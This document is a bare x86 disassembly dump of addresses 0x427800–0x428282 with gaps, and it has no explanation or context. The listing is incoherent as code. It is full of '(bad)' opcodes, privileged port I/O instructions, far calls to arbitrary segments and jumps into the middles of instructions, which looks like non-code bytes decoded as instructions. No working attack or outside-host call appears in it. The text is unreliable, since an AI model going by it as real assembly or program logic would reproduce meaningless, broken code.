  427800:	mov    eax,ds:0xa8482975
  427805:	cmp    ch,BYTE PTR [ebp+0x8]
  427808:	sub    ch,cl
  42780a:	xor    BYTE PTR [eax-0x20],0xcc
  42780e:	or     ah,BYTE PTR [ecx+0x0]
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	dec    edi
  427881:	lock outs dx,DWORD PTR ds:[esi]
  427883:	dec    ebp
  427884:	and    BYTE PTR [esi+0x1040001],ah
  42788a:	add    BYTE PTR [eax],al
  42788c:	ins    BYTE PTR es:[edi],dx
  42788d:	in     eax,0x98
  42788f:	sbb    bh,BYTE PTR [ebx+edx*2]
  427892:	dec    ecx
  427893:	add    eax,0xaf173592
  427898:	call   0x16179089
  42789d:	cmp    edi,DWORD PTR [edi]
  42789f:	aaa    
  4278a0:	cmc    
  4278a1:	jne    0x4278db
  4278a3:	sbb    al,dl
  4278a5:	sti    
  4278a6:	cli    
  4278a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278a8:	push   eax
  4278a9:	and    BYTE PTR [eax+edx*1+0x4d791ce8],cl
  4278b0:	das    
  4278b1:	sti    
  4278b2:	xor    cl,BYTE PTR [ebx-0x23]
  4278b5:	lock or ch,BYTE PTR [edi]
  4278b8:	xchg   ecx,eax
  4278b9:	pop    esp
  4278ba:	leave  
  4278bb:	adc    bl,bh
  4278bd:	rol    DWORD PTR [eax+0x4e],cl
  4278c0:	mov    bl,0xd2
  4278c2:	push   ebx
  4278c3:	sub    dl,dh
  4278c5:	adc    eax,0xd83896da
  4278ca:	mul    DWORD PTR [edi]
  4278cc:	mov    ah,0x73
  4278ce:	lods   eax,DWORD PTR ds:[si]
  4278d0:	daa    
  4278d1:	adc    ebx,DWORD PTR [esi+ecx*1-0x54383621]
  4278d8:	jbe    0x427897
  4278da:	test   DWORD PTR ds:0xf46da24,eax
  4278e0:	jecxz  0x42789a
  4278e2:	mov    edi,0xf3d00059
  4278e7:	pop    esi
  4278e8:	inc    ecx
  4278e9:	test   al,0x1f
  4278eb:	inc    esi
  4278ec:	jp     0x427876
  4278ee:	push   eax
  4278ef:	in     eax,0xde
  4278f1:	and    BYTE PTR ds:0xaeb8667e,dh
  4278f7:	xor    ah,BYTE PTR [esi-0x6eeeb84d]
  4278fd:	pop    es
  4278fe:	fistp  WORD PTR [edi+0x6d]
  427901:	add    eax,0xc9025ed9
  427906:	cmp    ebp,DWORD PTR [ebx]
  427908:	mov    BYTE PTR [ebp+ebp*8-0x6eb19afd],ah
  42790f:	fdiv   DWORD PTR [edi+0x6d6c8498]
  427915:	imul   eax,DWORD PTR [esi-0x2c],0x870211b2
  42791c:	xor    al,0xfc
  42791e:	jmp    0x4278ee
  427920:	loopne 0x4278f0
  427922:	xchg   BYTE PTR [edi],dh
  427924:	not    BYTE PTR [ebp-0x21123b37]
  42792a:	mov    WORD PTR [ebp-0x37],fs
  42792d:	mov    bl,0x9f
  42792f:	jnp    0x427960
  427931:	adc    al,0x40
  427933:	shl    BYTE PTR [edx-0x13f720cc],0x9f
  42793a:	xchg   edi,eax
  42793b:	sbb    al,0xb4
  42793d:	arpl   WORD PTR ds:0x9fc29b8,sp
  427943:	cs pop eax
  427945:	and    DWORD PTR [esi-0x78e08d89],ecx
  42794b:	cmp    BYTE PTR [ebx],0xc1
  42794e:	push   ss
  42794f:	jns    0x427916
  427951:	hlt    
  427952:	inc    ebx
  427953:	je     0x427918
  427955:	outs   dx,DWORD PTR es:[esi]
  427957:	mov    al,0xf1
  427959:	jo     0x427933
  42795b:	inc    ebp
  42795c:	jo     0x427988
  42795e:	sbb    dh,BYTE PTR [ebx+0xd]
  427961:	jae    0x42790c
  427963:	xor    al,bl
  427965:	xchg   ebx,eax
  427966:	jecxz  0x42794c
  427968:	jge    0x4279be
  42796a:	and    DWORD PTR [ecx],ebp
  42796c:	call   FWORD PTR [eax-0xe]
  42796f:	clc    
  427970:	aaa    
  427971:	push   esp
  427972:	dec    ebp
  427973:	jo     0x42790f
  427975:	sub    bh,dh
  427977:	cmp    dh,BYTE PTR [eax]
  427979:	inc    ebx
  42797a:	mov    ecx,0x22c98ced
  42797f:	mov    ah,0x59
  427981:	cld    
  427982:	dec    esp
  427983:	mov    BYTE PTR [eax],bh
  427985:	pushf  
  427986:	mov    esi,DWORD PTR [esi+0x6fe1954e]
  42798c:	dec    esp
  42798d:	shr    BYTE PTR [eax],cl
  42798f:	and    al,0x0
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x51e39a60]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	mov    al,ds:0x2f6297d3
  427a11:	dec    ebx
  427a12:	cli    
  427a13:	popf   
  427a14:	sahf   
  427a15:	xor    edx,edx
  427a17:	mov    ebx,0x464a775f
  427a1c:	push   ebp
  427a1d:	jmp    0x4279a7
  427a1f:	jl     0x427a45
  427a21:	outs   dx,BYTE PTR ds:[esi]
  427a22:	xchg   esi,eax
  427a23:	push   edx
  427a24:	call   0xf1b7:0x2d73d2a2
  427a2b:	not    ecx
  427a2d:	mov    ds:0x9087a276,eax
  427a32:	xchg   BYTE PTR [ecx],cl
  427a34:	add    ebx,ecx
  427a36:	mov    eax,ds:0xb163d1d6
  427a3b:	adc    ebx,DWORD PTR [edi+0x5be615ef]
  427a41:	cmp    eax,0x15163059
  427a46:	cdq    
  427a47:	and    dl,BYTE PTR ds:0x6d67d8da
  427a4d:	jmp    0x11f8:0x41795f13
  427a54:	das    
  427a55:	or     bh,BYTE PTR [ebp-0x10b5accf]
  427a5b:	daa    
  427a5c:	retf   0xb025
  427a5f:	xor    cl,BYTE PTR [edx]
  427a61:	mov    al,ds:0xceaa7fec
  427a66:	sbb    DWORD PTR [ebp+edi*1+0x3a],ebp
  427a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a6b:	inc    esi
  427a6c:	shl    BYTE PTR [eax],1
  427a6e:	push   ss
  427a6f:	and    DWORD PTR [edi-0x68e7a9c8],esp
  427a75:	inc    ebx
  427a76:	out    dx,al
  427a77:	mov    edx,0xce7c58f8
  427a7c:	and    BYTE PTR [esi+ebp*8+0x6d707a33],0x33
  427a84:	xor    BYTE PTR [esi],al
  427a86:	xor    DWORD PTR [edx+0x7d],ebx
  427a89:	mov    ch,0x60
  427a8b:	les    esi,FWORD PTR ds:0xd2faf624
  427a91:	cs mov ecx,edx
  427a94:	dec    ebx
  427a95:	sub    edi,DWORD PTR [esi+0x3170f652]
  427a9b:	add    BYTE PTR [eax+edx*1],cl
  427a9e:	aaa    
  427a9f:	inc    eax
  427aa0:	push   0xe7ad2ea9
  427aa5:	xchg   ecx,eax
  427aa6:	repnz mov bh,0x6a
  427aa9:	ins    DWORD PTR es:[edi],dx
  427aaa:	dec    edi
  427aab:	xor    eax,0xeb8ec5f5
  427ab0:	jle    0x427b2c
  427ab2:	xchg   ebx,eax
  427ab3:	jne    0x427b18
  427ab5:	inc    esi
  427ab6:	shl    DWORD PTR [esi-0x414d4c43],cl
  427abc:	imul   esp
  427abe:	imul   ecx,DWORD PTR [edi+0x441169b9],0xdabb4956
  427ac8:	and    edi,DWORD PTR [edi+eiz*2]
  427acb:	jne    0x427b4a
  427acd:	jecxz  0x427ac4
  427acf:	jns    0x427a56
  427ad1:	rol    DWORD PTR [eax-0x4a],1
  427ad4:	inc    ecx
  427ad5:	mov    eax,ds:0xca320624
  427ada:	repnz call 0xe217:0xf2b3159e
  427ae2:	call   0x3716:0x870c3ed6
  427ae9:	sbb    DWORD PTR [ecx-0x5906e5c1],esi
  427aef:	and    DWORD PTR [ebx],ebx
  427af1:	push   edx
  427af2:	out    0xc7,eax
  427af4:	aaa    
  427af5:	mov    ch,0xfa
  427af7:	or     BYTE PTR [ecx+0x23b45e3],cl
  427afd:	cmc    
  427afe:	xchg   esp,eax
  427aff:	daa    
  427b00:	test   DWORD PTR [ebp+ebx*1+0x52],esi
  427b04:	and    ah,BYTE PTR [esi]
  427b06:	ins    DWORD PTR es:[edi],dx
  427b07:	into   
  427b08:	inc    ecx
  427b09:	dec    esp
  427b0a:	xchg   esp,eax
  427b0b:	ds aas 
  427b0d:	or     eax,0x5f80
	...
  427b72:	add    BYTE PTR [eax],al
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	not    BYTE PTR ds:0x284907a2
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	or     BYTE PTR [ebx-0x74476017],dl
  427b92:	clc    
  427b93:	sub    cl,al
  427b95:	xor    bl,BYTE PTR [ecx+edx*8]
  427b98:	retf   
  427b99:	repnz sti 
  427b9b:	enter  0xbf0d,0x2a
  427b9f:	push   ecx
  427ba0:	mov    ds:0x6098f9ae,eax
  427ba5:	popf   
  427ba6:	stos   DWORD PTR es:[edi],eax
  427ba7:	jo     0x427b3f
  427ba9:	shr    dl,0xbb
  427bac:	push   ss
  427bad:	(bad)  
  427bae:	fnsave [ebx+0x27]
  427bb1:	inc    ecx
  427bb2:	arpl   WORD PTR [eax],cx
  427bb4:	push   0x465f26ed
  427bb9:	pop    edi
  427bba:	jb     0x427b90
  427bbc:	or     eax,0x9d52c69b
  427bc1:	xchg   ebx,eax
  427bc2:	call   0xa700:0xeec0e8a0
  427bc9:	cmp    al,0x25
  427bcb:	add    al,0xfe
  427bcd:	aas    
  427bce:	pop    es
  427bcf:	or     esp,DWORD PTR [eax-0x5dc18108]
  427bd5:	and    eax,0x3eccad00
  427bda:	mov    al,ds:0x9d39e671
  427bdf:	call   0x79c9ff95
  427be4:	rcr    DWORD PTR [esi-0xc],0xe2
  427be8:	loop   0x427b79
  427bea:	or     ch,0x62
  427bed:	js     0x427bd1
  427bef:	sbb    eax,0x83b37c63
  427bf4:	in     al,dx
  427bf5:	mov    ds:0x4373be4b,eax
  427bfa:	mov    ds:0xbe6c3787,al
  427bff:	lods   eax,DWORD PTR ds:[esi]
  427c00:	mov    eax,0x44624b90
  427c05:	add    eax,0x392c2380
  427c0a:	dec    eax
  427c0b:	mov    ds:0xf75feaa9,al
  427c10:	jp     0x427c7b
  427c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c13:	lahf   
  427c14:	xchg   ebp,eax
  427c15:	test   al,0x30
  427c17:	mov    edi,DWORD PTR [esi]
  427c19:	mov    dh,0xc3
  427c1b:	mov    edi,DWORD PTR [ecx-0x1c]
  427c1e:	pop    edx
  427c1f:	cwde   
  427c20:	ds inc esi
  427c22:	pop    ecx
  427c23:	dec    eax
  427c24:	inc    ebp
  427c25:	stos   BYTE PTR es:[edi],al
  427c26:	ins    BYTE PTR es:[edi],dx
  427c27:	daa    
  427c28:	fnstenv [ebp+0xe]
  427c2b:	adc    eax,0xb588a5c1
  427c30:	ds mov dl,0x31
  427c33:	sbb    DWORD PTR [edx+0x2],edi
  427c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c37:	push   ss
  427c38:	iret   
  427c39:	imul   esi,ecx,0xf
  427c3c:	xlat   BYTE PTR ds:[ebx]
  427c3d:	xchg   esi,eax
  427c3e:	ins    BYTE PTR es:[edi],dx
  427c3f:	sbb    ch,BYTE PTR ds:0x713a4b95
  427c45:	cld    
  427c46:	test   eax,0x2f05d8f3
  427c4b:	mov    BYTE PTR [eax],ah
  427c4d:	xor    cl,BYTE PTR [ebx]
  427c4f:	xor    ebx,DWORD PTR [edi]
  427c51:	arpl   WORD PTR [ebx],cx
  427c53:	ror    DWORD PTR [edx],1
  427c55:	mov    eax,ds:0x6a6fb815
  427c5a:	cs hlt 
  427c5c:	and    eax,DWORD PTR [edx]
  427c5e:	sub    ebp,edi
  427c60:	fild   DWORD PTR [eax-0x2b]
  427c63:	jno    0x427c30
  427c65:	(bad)  
  427c66:	xchg   esp,eax
  427c67:	out    dx,eax
  427c68:	xor    al,0xe3
  427c6a:	fist   DWORD PTR [ecx]
  427c6c:	popa   
  427c6d:	test   BYTE PTR [edx],dl
  427c6f:	or     BYTE PTR [edi-0xed21c55],0x62
  427c76:	inc    esi
  427c77:	push   0x5b
  427c79:	leave  
  427c7a:	sbb    esi,esi
  427c7c:	in     eax,dx
  427c7d:	scas   al,BYTE PTR es:[edi]
  427c7e:	sub    DWORD PTR [ecx-0xd],0x70
  427c82:	repz bound edx,QWORD PTR [edx]
  427c85:	stos   BYTE PTR es:[edi],al
  427c86:	pusha  
  427c87:	in     eax,0xb9
  427c89:	mov    edx,0xcff235b5
  427c8e:	push   esi
  427c8f:	dec    ebx
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xe82e5d44,ebx
  427d02:	mov    ch,0x11
  427d04:	sub    al,0xa9
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	inc    ebp
  427d0d:	in     al,dx
  427d0e:	adc    al,0x1d
  427d10:	(bad)  
  427d11:	cld    
  427d12:	scas   al,BYTE PTR es:[edi]
  427d13:	dec    ecx
  427d14:	add    edx,DWORD PTR [eax]
  427d16:	mov    DWORD PTR [ebx-0x46a2c814],edx
  427d1c:	pop    ecx
  427d1d:	pop    ebp
  427d1e:	mov    al,ds:0x1a5d8e63
  427d23:	sub    eax,0x6ffd81c4
  427d28:	shr    cl,1
  427d2a:	mov    ds:0xb733fab3,eax
  427d2f:	adc    DWORD PTR [edx+0x280dd0db],edx
  427d35:	(bad)  
  427d36:	out    dx,eax
  427d37:	and    ecx,edi
  427d39:	scas   al,BYTE PTR es:[edi]
  427d3a:	cdq    
  427d3b:	out    dx,eax
  427d3c:	mov    ebx,0x76ec7486
  427d41:	adc    eax,0x816c13f9
  427d46:	add    ah,cl
  427d48:	push   ss
  427d49:	test   BYTE PTR ds:0xa9a2658d,0x80
  427d50:	fist   WORD PTR [edi]
  427d52:	xchg   ecx,eax
  427d53:	add    esi,ecx
  427d55:	sub    esp,DWORD PTR [ecx+0x24]
  427d58:	sbb    bh,dl
  427d5a:	add    al,0xc8
  427d5c:	mov    bh,0xb1
  427d5e:	test   DWORD PTR ds:0xe4a29448,0xdf7f73f0
  427d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d69:	arpl   WORD PTR [edx-0x1b],di
  427d6c:	cmc    
  427d6d:	xlat   BYTE PTR ds:[ebx]
  427d6e:	push   esi
  427d6f:	out    0xe3,eax
  427d71:	je     0x427da9
  427d73:	adc    eax,0x1229364d
  427d78:	mov    ecx,0xbf7c0013
  427d7d:	dec    esp
  427d7e:	pop    es
  427d7f:	sub    eax,0x97208c15
  427d84:	sbb    eax,0x8e724f1
  427d89:	jecxz  0x427d3f
  427d8b:	sbb    BYTE PTR [esi-0x5a],dh
  427d8e:	mov    edi,0xd6dec629
  427d93:	push   0xb27f910
  427d98:	test   DWORD PTR [edi+0x7cb60cc8],0x6d23ed2c
  427da2:	(bad)  [edi-0x714fbbfe]
  427da8:	bound  edi,QWORD PTR [edx-0x1f9f239b]
  427dae:	(bad)  
  427daf:	pop    ebx
  427db0:	adc    eax,0x9c1ef09b
  427db5:	pop    edx
  427db6:	jnp    0x427e21
  427db8:	in     al,0x91
  427dba:	in     eax,dx
  427dbb:	into   
  427dbc:	mov    cl,0x1b
  427dbe:	inc    eax
  427dbf:	adc    eax,0x8b6f118f
  427dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427dc5:	fild   DWORD PTR [ecx-0x23]
  427dc8:	sti    
  427dc9:	mov    ecx,0x646b117
  427dce:	xchg   esi,eax
  427dcf:	xor    ebx,0xb355e192
  427dd5:	stc    
  427dd6:	mov    ebx,edx
  427dd8:	jb     0x427d69
  427dda:	repz in eax,0xe5
  427ddd:	out    0x9c,al
  427ddf:	ja     0x427e4f
  427de1:	push   ds
  427de2:	push   cs
  427de3:	repz call 0x8632:0x792b7935
  427deb:	xchg   DWORD PTR [ecx],edx
  427ded:	cmp    edx,DWORD PTR [edx-0x73a390c9]
  427df3:	add    al,BYTE PTR [ebx+edx*4]
  427df6:	scas   al,BYTE PTR es:[edi]
  427df7:	mov    cl,0xae
  427df9:	pop    ecx
  427dfa:	mov    ds:0x9cc2b7ca,al
  427dff:	xchg   bl,bh
  427e01:	mov    esp,0x20814967
  427e06:	ror    ch,cl
  427e08:	mov    dl,0xf0
  427e0a:	add    BYTE PTR [esi+0x4f],0xed
  427e0e:	out    dx,al
  427e0f:	lea    eax,[eax]
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	loop   0x427e78
  427e82:	jg     0x427e64
  427e84:	xor    BYTE PTR [edx+0x1040001],ch
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	adc    eax,0x4ace863e
  427e91:	sub    al,0x77
  427e93:	inc    edx
  427e94:	mov    dl,0x37
  427e96:	cmp    BYTE PTR [edi],0xf1
  427e99:	ret    0x8a0c
  427e9c:	and    esi,DWORD PTR [ecx]
  427e9e:	fmul   st(5),st
  427ea0:	mov    ebx,0x97e58886
  427ea5:	ins    DWORD PTR es:[edi],dx
  427ea6:	sub    DWORD PTR ss:[eax],esp
  427ea9:	sbb    BYTE PTR [ecx+0x124397ed],ch
  427eaf:	mov    ebx,0x597033b6
  427eb4:	icebp  
  427eb5:	mov    ebx,0x5d8e313
  427eba:	ror    DWORD PTR cs:[ecx+0x7bf335f5],cl
  427ec1:	pop    ss
  427ec2:	cmp    edx,DWORD PTR [ecx+ebx*1]
  427ec5:	pop    ebx
  427ec6:	jge    0x427eff
  427ec8:	cmp    al,bh
  427eca:	loopne 0x427ea2
  427ecc:	push   ss
  427ecd:	cmp    DWORD PTR [ebp+0x1f],0x7f
  427ed1:	mov    ecx,ebx
  427ed3:	inc    esi
  427ed4:	sbb    ecx,esi
  427ed6:	push   es
  427ed7:	(bad)  
  427ed8:	sbb    BYTE PTR [ebp+0x24],bh
  427edb:	mov    ds:0x7ba4feb2,eax
  427ee0:	mov    ecx,fs
  427ee2:	mov    dh,0xb1
  427ee4:	je     0x427eeb
  427ee6:	leave  
  427ee7:	mov    ebx,0x1c43d64a
  427eec:	leave  
  427eed:	xor    DWORD PTR [ecx-0x226b82e1],eax
  427ef3:	outs   dx,BYTE PTR ds:[esi]
  427ef4:	repz pusha 
  427ef6:	jo     0x427f2f
  427ef8:	shr    BYTE PTR [edi+eiz*1+0x4a],0xc5
  427efd:	push   edi
  427efe:	pop    ds
  427eff:	lea    ebp,[eax-0x70333f56]
  427f05:	jge    0x427f81
  427f07:	mov    ebp,0x9c18b3d6
  427f0c:	fxch   st(7)
  427f0e:	rol    ecx,1
  427f10:	pop    eax
  427f11:	and    BYTE PTR [esi-0x70795055],dh
  427f17:	stos   DWORD PTR es:[edi],eax
  427f18:	out    0xfc,al
  427f1a:	hlt    
  427f1b:	add    BYTE PTR [ebx-0x3238cb92],0x6c
  427f22:	lods   eax,DWORD PTR ds:[esi]
  427f23:	mov    ah,0xf9
  427f25:	icebp  
  427f26:	dec    ebx
  427f27:	ficomp DWORD PTR [edx-0x17]
  427f2a:	sub    BYTE PTR [ecx+0x3b],ch
  427f2d:	(bad)
  427f30:	pop    edx
  427f31:	cdq    
  427f32:	sbb    bh,BYTE PTR [esi]
  427f34:	jb     0x427eee
  427f36:	push   esp
  427f37:	fistp  DWORD PTR [ecx+0x4e]
  427f3a:	repz cmp ebp,DWORD PTR [eax-0x15]
  427f3e:	inc    ebp
  427f3f:	sbb    eax,0xcc412ece
  427f44:	pop    ecx
  427f45:	adc    bl,BYTE PTR [edi+0xf]
  427f48:	sub    DWORD PTR [eax],ebx
  427f4a:	ret    
  427f4b:	push   edx
  427f4c:	sbb    ecx,DWORD PTR [ebx-0x420873ce]
  427f52:	jb     0x427f72
  427f54:	retf   0x392b
  427f57:	popf   
  427f58:	inc    edx
  427f59:	mov    ds:0xae8ce609,eax
  427f5f:	std    
  427f60:	clc    
  427f61:	pop    es
  427f62:	and    esp,ebx
  427f64:	cdq    
  427f65:	or     DWORD PTR [eax+0x12],eax
  427f68:	xchg   ebp,eax
  427f69:	xor    DWORD PTR [ebx+0x2b4cd7a7],edx
  427f6f:	in     al,dx
  427f70:	push   0xbe68ba8b
  427f75:	sub    eax,0x1e0c38e0
  427f7a:	mov    ecx,0x22bc37c7
  427f7f:	fsub   QWORD PTR gs:[ecx]
  427f82:	cmp    ah,BYTE PTR ds:0xf060ef2c
  427f88:	ss popf 
  427f8a:	xor    BYTE PTR [edi],0xa9
  427f8d:	and    BYTE PTR [ecx+ebp*8+0x0],cl
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	repz call FWORD PTR [eax]
  428003:	pop    ebp
  428004:	xor    al,0xab
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	fidivr DWORD PTR [ebp-0x14]
  42800f:	pusha  
  428010:	jo     0x42805e
  428012:	inc    eax
  428013:	cdq    
  428014:	mov    eax,ds:0xdc887ca3
  428019:	sub    al,0x66
  42801b:	xor    ebx,edi
  42801d:	sub    BYTE PTR ds:0x44026217,bl
  428023:	pop    ecx
  428024:	lods   eax,DWORD PTR ds:[esi]
  428025:	mov    eax,0x1228dbf3
  42802a:	(bad)  
  42802b:	(bad)  
  42802c:	pop    edx
  42802d:	pop    ss
  42802e:	inc    esi
  42802f:	aas    
  428030:	push   0xea5f1172
  428035:	aam    0x64
  428037:	dec    ecx
  428038:	pushf  
  428039:	ins    BYTE PTR es:[edi],dx
  42803a:	test   BYTE PTR [ebx+0x62],dh
  42803d:	pop    esi
  42803e:	retf   
  42803f:	xor    BYTE PTR [esi+0x22],ah
  428042:	ficomp DWORD PTR [edi-0x4c3cfc93]
  428048:	jmp    DWORD PTR [eax]
  42804a:	mov    esp,0x9e3c517a
  42804f:	mov    esp,0x7972b560
  428054:	jp     0x42808d
  428056:	sbb    ebx,DWORD PTR [ecx-0x65]
  428059:	in     eax,0x19
  42805b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42805c:	fild   DWORD PTR [edi-0x45254f7a]
  428062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428063:	xor    eax,ebp
  428065:	xchg   ebx,eax
  428066:	int3   
  428067:	jne    0x428069
  428069:	mov    bh,0x16
  42806b:	fidivr DWORD PTR [eax-0xe94dba1]
  428071:	push   es
  428072:	aaa    
  428073:	ror    DWORD PTR [edx-0x40],0xc5
  428077:	mov    eax,0x1b5faf69
  42807c:	push   eax
  42807d:	mov    dl,0xbf
  42807f:	inc    ebx
  428080:	jg     0x428016
  428082:	enter  0x39e6,0xbc
  428086:	mov    bl,0xdc
  428088:	add    bl,BYTE PTR [ebp-0x49]
  42808b:	jle    0x428061
  42808d:	scas   al,BYTE PTR es:[edi]
  42808e:	mov    cs,eax
  428090:	addr16 xchg edx,eax
  428092:	fbstp  TBYTE PTR ds:[ebx+0x45]
  428096:	and    esp,DWORD PTR [ebx+0x4fc9a999]
  42809c:	mov    eax,0xd36c9238
  4280a1:	xchg   ebx,eax
  4280a2:	aam    0x48
  4280a4:	adc    eax,0x86dce058
  4280a9:	push   cs
  4280aa:	clc    
  4280ab:	sbb    dl,0x2c
  4280ae:	mov    ds:0x6fad8467,al
  4280b3:	js     0x4280e9
  4280b5:	push   ecx
  4280b6:	cmp    al,0x8e
  4280b8:	(bad)  
  4280b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280ba:	into   
  4280bb:	hlt    
  4280bc:	hlt    
  4280bd:	or     eax,0xf23fedcc
  4280c2:	stos   BYTE PTR es:[edi],al
  4280c3:	shr    bl,0x7e
  4280c6:	mov    cl,0x3d
  4280c8:	repz fisttp DWORD PTR [eax+0x15]
  4280cc:	rcr    DWORD PTR [ecx],1
  4280ce:	mov    esi,0x9a7b2be1
  4280d3:	or     eax,0x726ffb61
  4280d8:	imul   esp,DWORD PTR [ecx],0xffffffef
  4280db:	repnz sahf 
  4280dd:	out    dx,al
  4280de:	imul   esp,DWORD PTR [ecx],0x7050a108
  4280e4:	jb     0x4280a8
  4280e6:	and    cl,BYTE PTR [eax+eax*2+0x47]
  4280ea:	shl    DWORD PTR [ebp-0x1fbd016a],1
  4280f0:	icebp  
  4280f1:	test   al,0x24
  4280f3:	push   0xfffffff5
  4280f5:	outs   dx,BYTE PTR ds:[esi]
  4280f6:	xchg   edi,eax
  4280f7:	pop    ebx
  4280f8:	out    0x23,al
  4280fa:	and    DWORD PTR [ebp*2+0x3db8bca6],edx
  428101:	xor    al,ch
  428103:	sti    
  428104:	stc    
  428105:	inc    edi
  428106:	adc    ah,BYTE PTR [edi-0x4fb28e4a]
  42810c:	fdivrp st(4),st
  42810e:	rcr    BYTE PTR [edx],0x0
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	lahf   
  428181:	call   DWORD PTR [eax+0x44]
  428184:	cmp    BYTE PTR [ecx+eax*1+0x10400],ch
  42818b:	add    BYTE PTR [edx-0x53],ch
  42818e:	rcr    BYTE PTR [edi+0x20],1
  428191:	pop    ds
  428192:	int3   
  428193:	aam    0xd9
  428195:	sub    BYTE PTR [edx+0x5d],dl
  428198:	dec    edx
  428199:	cs je  0x4281c9
  42819c:	mov    eax,0xfb9f44e4
  4281a1:	outs   dx,BYTE PTR ds:[esi]
  4281a2:	cs dec esi
  4281a4:	adc    BYTE PTR [esi+ebp*8],ah
  4281a7:	dec    ecx
  4281a8:	or     BYTE PTR [eax+0xe08771e],ch
  4281ae:	and    DWORD PTR [edx+0x35],ecx
  4281b1:	xor    DWORD PTR [ecx+0x576464fa],esp
  4281b7:	adc    eax,0x368c88f5
  4281bc:	jg     0x428208
  4281be:	xchg   ebx,eax
  4281bf:	mov    ebp,0xbb0a663a
  4281c4:	mov    al,0xfb
  4281c6:	es mov esi,0xc0ddea09
  4281cc:	je     0x4281d2
  4281ce:	stos   BYTE PTR es:[edi],al
  4281cf:	popf   
  4281d0:	sar    DWORD PTR [esi+0x64],1
  4281d3:	and    bh,BYTE PTR [eax]
  4281d5:	je     0x428237
  4281d7:	mov    ecx,0xc985aa26
  4281dc:	mov    cs,WORD PTR [edi-0x3b]
  4281df:	sub    DWORD PTR [ebp-0x181a4e9e],eax
  4281e5:	mov    ah,0x78
  4281e7:	mov    ebp,0xda515efc
  4281ec:	sbb    ebp,DWORD PTR [esi+0x4a]
  4281ef:	das    
  4281f0:	lods   al,BYTE PTR ds:[esi]
  4281f1:	sbb    ecx,DWORD PTR [ebx]
  4281f3:	fisubr DWORD PTR [ecx+ecx*4]
  4281f6:	and    eax,0x50f8164
  4281fb:	inc    esp
  4281fc:	push   ecx
  4281fd:	fmul   QWORD PTR [edi-0x66]
  428200:	aas    
  428201:	aaa    
  428202:	or     DWORD PTR [esi+eiz*4],ebx
  428205:	dec    edx
  428206:	push   ebp
  428207:	rcr    BYTE PTR [ecx+0x57190876],1
  42820d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42820e:	mov    fs,WORD PTR [ebx-0x78]
  428211:	scas   al,BYTE PTR es:[edi]
  428212:	xchg   edx,eax
  428213:	or     edx,DWORD PTR [ecx]
  428215:	les    esp,FWORD PTR [ebp+0x785643b]
  42821b:	jge    0x42825d
  42821d:	(bad)  
  42821e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42821f:	xor    eax,0xe4a9e17b
  428224:	mov    eax,ds:0x61cd4ac1
  428229:	mov    ds:0x951dc2e3,al
  42822e:	lods   al,BYTE PTR ds:[esi]
  42822f:	push   esi
  428230:	js     0x42820b
  428232:	dec    esi
  428233:	mov    ecx,0x898c58a8
  428238:	inc    ebp
  428239:	repz cmp al,0x9e
  42823c:	pop    ss
  42823d:	dec    eax
  42823e:	or     esp,edi
  428240:	dec    esp
  428241:	mov    ds:0x9d00d9f7,al
  428246:	cwde   
  428247:	xchg   edx,eax
  428248:	fistp  DWORD PTR [ebx-0x52bce617]
  42824e:	popa   
  42824f:	mov    ah,0xf0
  428251:	(bad)  
  428252:	out    0x9c,al
  428254:	xchg   esi,eax
  428255:	call   0x7188:0x92023931
  42825c:	imul   esp
  42825e:	adc    eax,0xf9e43a85
  428263:	push   ss
  428264:	push   0x46
  428266:	les    esi,FWORD PTR [ebp-0x45]
  428269:	pop    eax
  42826a:	jg     0x428225
  42826c:	pop    ds
  42826d:	mov    edx,0xc11da4c5
  428272:	mov    ?,WORD PTR [edi+0x235c4ee2]
  428278:	sbb    bh,al
  42827a:	dec    esi
  42827b:	nop
  42827c:	dec    edi
  42827d:	dec    esi
  42827e:	pandn  mm2,QWORD PTR [eax+ebp*2]
  428282:	ins    DWORD PTR es:[edi],dx
